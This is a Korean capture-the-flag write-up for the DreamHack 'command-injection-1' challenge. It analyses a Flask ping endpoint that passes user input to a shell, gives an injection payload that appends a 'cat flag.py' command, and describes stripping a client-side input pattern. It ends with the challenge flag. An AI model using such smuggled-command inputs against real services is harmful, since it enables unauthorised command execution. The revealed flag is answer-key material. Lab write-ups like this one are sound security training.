# [DreamHack] command-injection-1

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 특정 Host에 ping 패킷을 보내는 서비스입니다.
> Command Injection을 통해 플래그를 획득하세요. 플래그는 `flag.py`에 있습니다.
>
> Release: [command-injection-1.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8551885/command-injection-1.zip)

## Analysis

```python
@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host') # ping을 보낼 host 입력
        cmd = f'ping -c 3 "{host}"' # command injection 가능
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5) # sh 셸에서 cmd 실행
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')
```

입력한 `host`를 `f'ping -c 3 "{host}"'`에 넣어서 실행한다. 필터링이 없기 때문에 command injection으로 `flag.py` 파일의 내용을 출력하면 된다.

## Exploit

`host`에 `8.8.8.8" & cat "flag.py`를 입력하면 `cmd`는 `ping -c 3 "8.8.8.8" & cat "flag.py"`가 되어, ping 요청의 응답을 받음과 동시에 플래그를 획득할 수 있다.

문제 사이트의 입력 창에는 `pattern="[A-Za-z0-9.]{5,20}"` 속성이 있어서 자유롭게 입력할 수 없으므로, 이 속성을 먼저 없애야 한다.

![image](https://user-images.githubusercontent.com/104156058/165029098-7d9d197f-eb8c-4b6e-8770-0c4d09380dd2.png)

![image](https://user-images.githubusercontent.com/104156058/165029127-774ffc4e-74dd-406a-9b20-468805a32525.png)

`pattern` 속성을 없애고 나서

![image](https://user-images.githubusercontent.com/104156058/165029183-2f6efa30-c56d-4a59-ad0a-05d9d74e6338.png)

이렇게 입력을 주면

![image](https://user-images.githubusercontent.com/104156058/165029230-984a6df3-aa3f-401d-bc34-53fc6d21a30d.png)

플래그를 획득할 수 있다.

```
flag: DH{pingpingppppppppping!!}
```